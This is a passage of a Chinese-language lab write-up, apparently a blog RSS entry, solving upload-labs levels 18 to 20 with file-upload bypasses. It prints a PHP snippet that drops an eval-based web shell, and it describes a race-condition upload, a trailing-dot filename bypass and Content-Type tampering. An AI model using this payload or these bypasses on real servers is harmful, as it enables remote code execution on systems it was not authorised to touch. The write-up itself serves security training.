    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;这里的路径拼接有问题，上传一个 &lt;code&gt;jpg&lt;/code&gt; 图片应该是 &lt;code&gt;upload/1747315674.jpg&lt;/code&gt;，但实际拼出来的是 &lt;code&gt;upload1747315674.jpg&lt;/code&gt;，修改 &lt;code&gt;Pass-18/myupload.php&lt;/code&gt; 的 &lt;code&gt;$this-&amp;gt;cls_upload_dir = $dir;&lt;/code&gt; 为 &lt;code&gt;$this-&amp;gt;cls_upload_dir = $dir.&#39;/&#39;;&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_21-38-24.6pnqe5xqw1.webp&#34; alt=&#34;PixPin_2025-05-15_21-38-24&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;利用 &lt;strong&gt;Apache 多后缀解析漏洞 + 条件竞争&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上传 &lt;code&gt;shell.php.7z&lt;/code&gt;（用于生成 &lt;code&gt;fish.php&lt;/code&gt;）&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;shell.php.7z&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fputs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;fish.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php @eval(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;_POST[&amp;#39;fish&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-17-47.5mo14or8rq.webp&#34; alt=&#34;PixPin_2025-05-16_21-17-47&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问 &lt;code&gt;shell.php.7z&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-18-52.1sf9lqaml8.webp&#34; alt=&#34;PixPin_2025-05-16_21-18-52&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;将两条请求发送到 &lt;code&gt;Intruder&lt;/code&gt; 模块&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-20-46.8z6qz2bl5w.webp&#34; alt=&#34;PixPin_2025-05-16_21-20-46&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;配置条件竞争的 &lt;code&gt;payload&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-21-32.7zqnlw9sq9.webp&#34; alt=&#34;PixPin_2025-05-16_21-21-32&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-21-49.6f0wmfcy6h.webp&#34; alt=&#34;PixPin_2025-05-16_21-21-49&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;观察到 &lt;code&gt;/upload-labs-0.1/upload/shell.php.7z&lt;/code&gt; 攻击时出现 &lt;code&gt;200&lt;/code&gt; 状态码时停止攻击&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-22-28.969yuhzx9v.webp&#34; alt=&#34;PixPin_2025-05-16_21-22-28&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑连接 &lt;code&gt;fish.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-49-17.3yeo61kdzi.webp&#34; alt=&#34;PixPin_2025-05-15_20-49-17&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-19&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-19&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-19&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;尝试 &lt;strong&gt;点绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;保存名称 &lt;code&gt;fish1.php.&lt;/code&gt;，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-34-50.1zihh8mjzw.webp&#34; alt=&#34;PixPin_2025-05-16_22-34-50&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑连接 &lt;code&gt;fish1.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-35-20.39lenk532m.webp&#34; alt=&#34;PixPin_2025-05-16_22-35-20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-20&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-20&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-20&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;代码审计&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-47-20.1sf9ltgdkj.webp&#34; alt=&#34;PixPin_2025-05-16_22-47-20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;修改 &lt;code&gt;Content-Type: image/jpeg&lt;/code&gt;、&lt;code&gt;save_name[0]&lt;/code&gt; 和 &lt;code&gt;save_name[2]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-45-28.2veywp9uo4.webp&#34; alt=&#34;PixPin_2025-05-16_22-45-28&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑连接 &lt;code&gt;fish.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-45-57.3rbgc5k7ps.webp&#34; alt=&#34;PixPin_2025-05-16_22-45-57&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
